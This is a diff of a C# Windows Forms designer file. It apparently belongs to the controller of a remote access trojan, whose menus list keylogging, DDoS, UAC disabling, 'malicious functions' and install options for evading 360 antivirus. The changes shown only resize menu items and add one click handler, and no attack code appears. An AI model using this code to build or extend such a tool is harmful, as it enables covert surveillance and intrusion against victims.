@@ -179,7 +179,7 @@
             this.录音ToolStripMenuItem,
             this.窗口通知ToolStripMenuItem});
             this.远程管理ToolStripMenuItem.Name = "远程管理ToolStripMenuItem";
-            this.远程管理ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.远程管理ToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
             this.远程管理ToolStripMenuItem.Text = "远程管理";
             // 
             // 命令行ToolStripMenuItem
@@ -258,7 +258,7 @@
             this.键盘记录ToolStripMenuItem1,
             this.文件查找ToolStripMenuItem});
             this.控制功能ToolStripMenuItem.Name = "控制功能ToolStripMenuItem";
-            this.控制功能ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.控制功能ToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
             this.控制功能ToolStripMenuItem.Text = "控制功能";
             // 
             // 发送文件ToolStripMenuItem1
@@ -336,7 +336,7 @@
             this.关闭UACToolStripMenuItem,
             this.打开CD槽ToolStripMenuItem});
             this.恶意功能ToolStripMenuItem.Name = "恶意功能ToolStripMenuItem";
-            this.恶意功能ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.恶意功能ToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
             this.恶意功能ToolStripMenuItem.Text = "恶意功能";
             // 
             // dDOSToolStripMenuItem
@@ -403,7 +403,7 @@
             this.开启ToolStripMenuItem,
             this.关闭ToolStripMenuItem});
             this.锁屏ToolStripMenuItem.Name = "锁屏ToolStripMenuItem";
-            this.锁屏ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.锁屏ToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
             this.锁屏ToolStripMenuItem.Text = "锁屏";
             // 
             // 开启ToolStripMenuItem
@@ -426,7 +426,7 @@
             this.客户端ToolStripMenuItem,
             this.系统ToolStripMenuItem});
             this.系统管理ToolStripMenuItem.Name = "系统管理ToolStripMenuItem";
-            this.系统管理ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.系统管理ToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
             this.系统管理ToolStripMenuItem.Text = "系统管理";
             // 
             // 客户端ToolStripMenuItem
@@ -438,7 +438,7 @@
             this.卸载ToolStripMenuItem,
             this.储存文件夹ToolStripMenuItem});
             this.客户端ToolStripMenuItem.Name = "客户端ToolStripMenuItem";
-            this.客户端ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.客户端ToolStripMenuItem.Size = new System.Drawing.Size(112, 22);
             this.客户端ToolStripMenuItem.Text = "客户端";
             // 
             // 关闭ToolStripMenuItem1
@@ -483,7 +483,7 @@
             this.重启ToolStripMenuItem,
             this.注销ToolStripMenuItem});
             this.系统ToolStripMenuItem.Name = "系统ToolStripMenuItem";
-            this.系统ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.系统ToolStripMenuItem.Size = new System.Drawing.Size(112, 22);
             this.系统ToolStripMenuItem.Text = "系统";
             // 
             // 关机ToolStripMenuItem
@@ -521,28 +521,28 @@
             // 无提示不过360ToolStripMenuItem
             // 
             this.无提示不过360ToolStripMenuItem.Name = "无提示不过360ToolStripMenuItem";
-            this.无提示不过360ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.无提示不过360ToolStripMenuItem.Size = new System.Drawing.Size(146, 22);
             this.无提示不过360ToolStripMenuItem.Text = "win10 无360";
             this.无提示不过360ToolStripMenuItem.Click += new System.EventHandler(this.无提示不过360ToolStripMenuItem_Click);
             // 
             // 过360核晶ToolStripMenuItem
             // 
             this.过360核晶ToolStripMenuItem.Name = "过360核晶ToolStripMenuItem";
-            this.过360核晶ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.过360核晶ToolStripMenuItem.Size = new System.Drawing.Size(146, 22);
             this.过360核晶ToolStripMenuItem.Text = "win10 有360";
             this.过360核晶ToolStripMenuItem.Click += new System.EventHandler(this.过360核晶ToolStripMenuItem_Click);
             // 
             // 有提示ToolStripMenuItem
             // 
             this.有提示ToolStripMenuItem.Name = "有提示ToolStripMenuItem";
-            this.有提示ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.有提示ToolStripMenuItem.Size = new System.Drawing.Size(146, 22);
             this.有提示ToolStripMenuItem.Text = "通用 有提示";
             this.有提示ToolStripMenuItem.Click += new System.EventHandler(this.有提示ToolStripMenuItem_Click);
             // 
             // win7ToolStripMenuItem
             // 
             this.win7ToolStripMenuItem.Name = "win7ToolStripMenuItem";
-            this.win7ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.win7ToolStripMenuItem.Size = new System.Drawing.Size(146, 22);
             this.win7ToolStripMenuItem.Text = "win7";
             this.win7ToolStripMenuItem.Click += new System.EventHandler(this.win7ToolStripMenuItem_Click);
             // 
@@ -551,20 +551,20 @@
             this.安装ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.过360启动项ToolStripMenuItem});
             this.安装ToolStripMenuItem.Name = "安装ToolStripMenuItem";
-            this.安装ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.安装ToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
             this.安装ToolStripMenuItem.Text = "安装";
             // 
             // 过360启动项ToolStripMenuItem
             // 
             this.过360启动项ToolStripMenuItem.Name = "过360启动项ToolStripMenuItem";
-            this.过360启动项ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.过360启动项ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
             this.过360启动项ToolStripMenuItem.Text = "计划任务";
             this.过360启动项ToolStripMenuItem.Click += new System.EventHandler(this.过360启动项ToolStripMenuItem_Click);
             // 
             // 详细信息ToolStripMenuItem
             // 
             this.详细信息ToolStripMenuItem.Name = "详细信息ToolStripMenuItem";
-            this.详细信息ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.详细信息ToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
             this.详细信息ToolStripMenuItem.Text = "详细信息";
             this.详细信息ToolStripMenuItem.Click += new System.EventHandler(this.详细信息ToolStripMenuItem_Click);
             // 
@@ -775,13 +775,14 @@
             // 文档ToolStripMenuItem
             // 
             this.文档ToolStripMenuItem.Name = "文档ToolStripMenuItem";
-            this.文档ToolStripMenuItem.Size = new System.Drawing.Size(100, 22);
+            this.文档ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.文档ToolStripMenuItem.Text = "文档";
+            this.文档ToolStripMenuItem.Click += new System.EventHandler(this.文档ToolStripMenuItem_Click);
             // 
             // 关于ToolStripMenuItem
             // 
             this.关于ToolStripMenuItem.Name = "关于ToolStripMenuItem";
-            this.关于ToolStripMenuItem.Size = new System.Drawing.Size(100, 22);
+            this.关于ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.关于ToolStripMenuItem.Text = "关于";
             this.关于ToolStripMenuItem.Click += new System.EventHandler(this.aboutToolStripMenuItem1_Click);
             // 
